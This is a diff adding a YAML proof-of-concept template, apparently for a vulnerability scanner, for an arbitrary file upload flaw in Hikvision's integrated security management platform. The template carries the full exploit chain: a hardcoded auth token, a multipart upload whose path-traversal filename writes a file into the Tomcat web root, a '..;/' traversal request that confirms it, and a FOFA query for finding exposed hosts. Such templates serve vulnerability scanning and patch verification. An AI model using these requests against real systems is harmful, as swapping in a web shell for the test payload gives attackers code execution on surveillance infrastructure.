@@ -1,0 +1,32 @@
+id: poc-yaml-hikvision-uploadallpackage-anyfile-upload
+info:
+  name: 海康威视综合安防管理平台 uploadAllPackage 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 海康威视综合安防管理平台
+  fofa: title="综合安防管理平台"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /center_install/picUploadService/v1/uploadAllPackage/image
+  headers:
+    Token: SElLIGlhL3NmaGNjaTY3WWxWK0Y6UzVCcjg1a2N1dENqVUNIOUM3SE1GamNkN2dnTE1BN1dGTDJldFE0UXFvbz0=
+    Content-Type: multipart/form-data; boundary=--------------------------553898708333958420021355
+  data: '----------------------------553898708333958420021355
+
+    Content-Disposition: form-data; name="sendfile"; filename="../../../../components/tomcat85linux64.1/webapps/eportal/{{.t1}}.js"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t2}}
+
+    ----------------------------553898708333958420021355--'
+  expression: status_code == 500 && contains(body,"upload")
+- method: GET
+  path: /portal/ui/login/..;/..;/{{.t1}}.js
+  expression: status_code == 200 && trim(body) == t2
+transport: http
